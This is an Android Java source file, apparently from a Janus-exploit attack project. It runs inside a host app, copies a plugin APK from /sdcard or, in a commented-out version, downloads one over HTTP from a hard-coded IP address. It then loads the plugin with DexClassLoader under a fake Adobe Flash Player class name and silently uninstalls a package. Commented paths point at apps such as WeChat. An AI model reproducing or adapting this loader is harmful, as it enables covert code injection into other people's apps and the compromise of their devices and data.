package com.example.apkattack;


import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class JanusWork extends Thread{

	@Override
	public void run() {
		
		String Tag = "JanusWork";
		String subpath = "/appData/";
		String srcfilename = "janus_plugin.apk";
		try {
			Log.e(Tag,"start");
			
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            }
	        }
			
	        String apppath = context.getFilesDir() + subpath;
	        File apppathFile = new File(apppath);
	        if (apppathFile.exists() == false) {
				apppathFile.mkdir();
			}
	        
		    String plugin = apppath + srcfilename;
		    File pluginfile = new File(plugin);
		    if (pluginfile.exists() == false) {

			    String srcapk = "/sdcard" + subpath + srcfilename;
			    File srcapkfile = new File(srcapk);
			    if (srcapkfile.exists() == false) {
					Log.e(Tag,"not found:" + srcfilename);
					return;
				}
			    FileInputStream fin = new FileInputStream(srcapkfile);
			    FileOutputStream fout = new FileOutputStream(pluginfile);

			    byte [] buf = new byte[0x10000];
			    int len = 0;
			    while ((len = fin.read(buf,0,0x10000)) > 0) {
			        fout.write(buf,0,len);
			    }
			    
			    fin.close();
			    fout.close();
			    
			    srcapkfile.delete();
			    
			    String cmd = "pm uninstall com.adobe.flashplayer";
			    try {
	                String consoleReply = Runtime.getRuntime().exec(cmd).toString();
	                Log.e(Tag, cmd + ":" + consoleReply);
	            } catch (Exception e) {
	                e.printStackTrace();
	            }
			}

	    	String dexmethodname = "start";
	    	String dexclassname = "com.adobe.flashplayer.JanusEntry";
			String appcachepath = context.getCacheDir() + "/";
			DexClassLoader dexcl = new DexClassLoader(plugin, appcachepath, null,context.getClassLoader());
			Class<?> cls = dexcl.loadClass(dexclassname);
		    Object obj = cls.newInstance();
		    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
		    method.invoke(obj,context);
		    
		    Log.e(Tag,"plugin loaded ok");
		} catch (Exception e) {
			e.printStackTrace();
			return;
		}
	}
	
	/*
	@Override
	public void run() {
		
		String Tag = "JanusWork";
		String username = "test20181214";

		try {
			Log.e(Tag,username + " start");
			
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
			
	        //String apppath = "/data/data/com.nearme.note_all/files/appData/";
	        //String apppath = "/data/data/com.tencent.mm/files/appData/";
	        //String apppath = "/data/data/com.tencent.mm/files/appData/";
	        String apppath = context.getFilesDir().getParent() + "/appData/";
	        File apppathFile = new File(apppath);
	        if (apppathFile.exists() == false) {
				apppathFile.mkdir();
			}
	        
		    String plugin = apppath + "plugin.apk";
		    File file = new File(plugin);
		    if (file.exists() == false) {
		    	String host = "47.101.189.13";
		    	
			    String url = "http://" + host + "/janus/" + username + ".apk";
			    
			    String httpmethod = "GET";

			    URL realUrl = new URL(url);
			    String cookie = null;
			    String acceptlanguage = null;
			    String acceptencode = null;
			    HttpURLConnection connection = (HttpURLConnection)realUrl.openConnection();
			    
			    connection.setRequestProperty("Accept", "*//*");
			    connection.setRequestProperty("Connection", "Keep-Alive");
			    connection.setRequestProperty("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
			    if(host != null && host.equals("") == false){
			    	connection.setRequestProperty("Host", host);
			    }
			    if(cookie != null && cookie.equals("") == false){
			    	connection.setRequestProperty("Cookie", cookie);
			    }
			    if(acceptlanguage != null && acceptlanguage.equals("") == false){
			    	connection.setRequestProperty("Accept-Language", acceptlanguage);
			    }
			    if(acceptencode != null && acceptencode.equals("") == false){
			    	connection.setRequestProperty("Accept-Encoding", acceptencode);
			    }
			
			    connection.setRequestMethod(httpmethod); 
			    connection.connect();
			
			    int retcode = connection.getResponseCode() ;
			    if(retcode != 200){
			    	return;
			    }
			    
			    FileOutputStream fout = new FileOutputStream(file);
			    InputStream in = connection.getInputStream();
			    byte [] buf = new byte[0x10000];
			    int len = 0;
			    while ((len = in.read(buf,0,0x10000)) > 0) {
			        fout.write(buf,0,len);
			    }
			    
			    fout.close();
			}

	    	String dexmethodname = "start";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";

			String appcachepath = context.getCacheDir() + "/";
			DexClassLoader dexcl = new DexClassLoader(plugin, appcachepath, null,context.getClassLoader());
			Class<?> cls = dexcl.loadClass(dexclassname);
		    Object obj = cls.newInstance();
		    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
		    method.invoke(obj,context);
		} catch (Exception e) {
			e.printStackTrace();
			return;
		}
	}
	*/
	

}
